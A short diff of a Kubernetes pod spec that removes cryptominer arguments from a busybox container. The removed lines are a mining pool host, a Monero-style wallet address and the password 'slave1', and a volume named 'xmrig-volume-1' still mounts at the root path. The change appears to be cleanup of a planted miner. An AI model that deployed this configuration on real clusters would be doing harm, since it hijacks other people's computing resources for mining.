@@ -17,12 +17,6 @@ spec:
     image: busybox
     command:
     - ls
-    - -o
-    - node.hacknoob.win:3333
-    - -u
-    - 46DWjxWviwCVHbYHaMxjusjGKm55LJmG6f3YTCJDmTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn
-    - -p
-    - slave1
     volumeMounts:
     - name: xmrig-volume-1
       mountPath: /
